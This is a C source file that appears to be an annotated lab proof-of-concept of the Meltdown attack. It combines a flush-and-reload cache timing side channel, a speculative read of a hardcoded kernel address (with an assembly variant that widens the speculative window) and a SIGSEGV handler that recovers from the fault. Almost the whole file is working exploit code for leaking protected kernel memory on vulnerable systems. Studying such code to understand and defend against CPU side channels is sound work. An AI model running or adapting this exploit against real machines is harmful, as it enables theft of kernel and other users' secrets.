#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

// Global array used as the side-channel probe buffer.
// Each element is separated by 4096 bytes (page size) to ensure they are in different cache lines.
// This prevents false positives from cache line sharing or CPU prefetching.
uint8_t array[256 * 4096];

// Cache hit threshold in CPU cycles.
// If memory access time is below this value, it indicates the data was in the cache.
#define CACHE_HIT_THRESHOLD 80

// Offset added to memory accesses to make them less predictable,
// reducing interference from CPU's hardware prefetcher.
#define DELTA 1024

/*************** Flush + Reload Setup ****************/

// Flush the probe array from the CPU cache to ensure it starts in an uncached state.
void flushSideChannel() {
    // Step 1: Access each page to ensure it is paged into physical memory.
    for (int i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1;
    }

    // Step 2: Use CLFLUSH to flush each page from the CPU cache.
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array[i * 4096 + DELTA]);
    }
}

// Reload each array element and measure how long it takes to access.
// Fast access implies it was brought into cache (likely via speculative execution).
void reloadSideChannel() {
    int junk = 0;
    uint64_t time1, time2;
    volatile uint8_t *addr;

    for (int i = 0; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];

        // Measure access time
        time1 = __rdtscp(&junk);       // Read time-stamp counter (before)
        junk = *addr;                  // Access memory
        time2 = __rdtscp(&junk) - time1; // Read time-stamp counter (after) and calculate difference

        // If access is faster than the threshold, the data was cached → leaked byte value
        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("array[%d * 4096 + %d] is in cache.\n", i, DELTA);
            printf("The Secret = %d (ASCII '%c')\n", i, i);
        }
    }
}

/*************** Meltdown Core ****************/

// This function simulates the Meltdown attack.
// It tries to access a protected kernel memory address, which will cause a segmentation fault.
// However, due to speculative execution, the second line might execute before the CPU realizes the fault,
// causing the secret value to influence the cache.
void meltdown(unsigned long kernel_data_addr) {
    char kernel_data = *(char *)kernel_data_addr; // Illegal access, causes SIGSEGV
    array[kernel_data * 4096 + DELTA] += 1;       // Access probe array based on secret value (if speculatively executed)
}

// Optional version with inline assembly to simulate more CPU delay, increasing speculative execution window.
void meltdown_asm(unsigned long kernel_data_addr) {
    char kernel_data = 0;

    // Introduce delay via no-op instructions to expand speculative window
    asm volatile(
        ".rept 400;"                // Repeat the following instruction 400 times
        "add $0x141, %%eax;"       // Arbitrary arithmetic to consume cycles
        ".endr;"
        :
        :
        : "eax"
    );

    // Speculatively access secret
    kernel_data = *(char *)kernel_data_addr;
    array[kernel_data * 4096 + DELTA] += 1;
}

/*************** Signal Handling ****************/

// Buffer to store execution context for non-local jump (used for recovery from SIGSEGV)
static sigjmp_buf jbuf;

// Signal handler for segmentation fault (SIGSEGV).
// When triggered, it performs a non-local jump back to a safe location in main().
void catch_segv() {
    siglongjmp(jbuf, 1); // Jump back to saved context in main(), sigsetjmp() will return non-zero
}

/*************** Main Function ****************/

int main() {
    // Register the signal handler so that segmentation faults will call catch_segv()
    signal(SIGSEGV, catch_segv);

    // Step 1: Flush the side-channel array from the cache
    flushSideChannel();

    // Step 2: Try to read from a protected memory address
    // sigsetjmp() saves CPU context in jbuf.
    // If we jump back from siglongjmp(), sigsetjmp() will return non-zero.
    if (sigsetjmp(jbuf, 1) == 0) {
        // First time through: try illegal memory access
        meltdown(0xfb61b000); // Replace with real kernel address (if known)
    } else {
        // If SIGSEGV occurs and we jump back here, print a message
        printf("Memory access violation caught!\n");
    }

    // Step 3: Reload the array and check which index is cached,
    // indicating the leaked secret byte
    reloadSideChannel();

    return 0;
}
